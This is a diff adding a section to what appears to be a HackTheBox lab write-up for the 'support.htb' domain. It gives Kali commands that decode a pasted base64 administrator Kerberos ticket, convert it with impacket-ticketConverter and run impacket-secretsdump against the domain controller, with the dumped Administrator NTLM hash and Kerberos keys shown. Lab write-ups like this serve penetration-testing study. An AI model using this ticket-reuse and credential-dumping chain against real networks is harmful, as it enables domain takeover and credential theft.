@@ -1514,17 +1514,76 @@ importing rubeus
 
 ```
 
+on kali:
 
 ```
- klist
-Ticket cache: FILE:attacker.ccache
-Default principal: attackersystem$@SUPPORT.HTB
+cat > admin.b64 << 'EOF'   
+heredoc> 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
 
-Valid starting       Expires              Service principal
-07/13/2026 14:56:05  07/14/2026 00:56:05  krbtgt/support.htb@SUPPORT.HTB
-        renew until 07/20/2026 14:56:05
+heredoc> EOF
 
 ```
+
+```
+tr -d '[:space:]' < admin.b64 > administrator.b64
+```
+
+```
+base64 -d administrator.b64 > administrator.kirbi
+```
+
+```
+ impacket-ticketConverter administrator.kirbi administrator.ccache                                
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] converting kirbi to ccache...
+[+] done                                            
+```
+
+```
+impacket-secretsdump -k -no-pass -dc-ip 10.129.50.211 support.htb/administrator@dc.support.htb -just-dc-user Administrator
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:f5301f54fad85ba357fb859c94c5c31a6abe61f6db1986c03574bfd6c2e31632
+Administrator:aes128-cts-hmac-sha1-96:678dcbcbf92bc72fd318ac4aa06ede64
+Administrator:des-cbc-md5:13a8c8abc12f945e
+[*] Cleaning up... 
+
+```
+
+
+
 ### Exploitation
 
 Step-by-step privilege escalation.
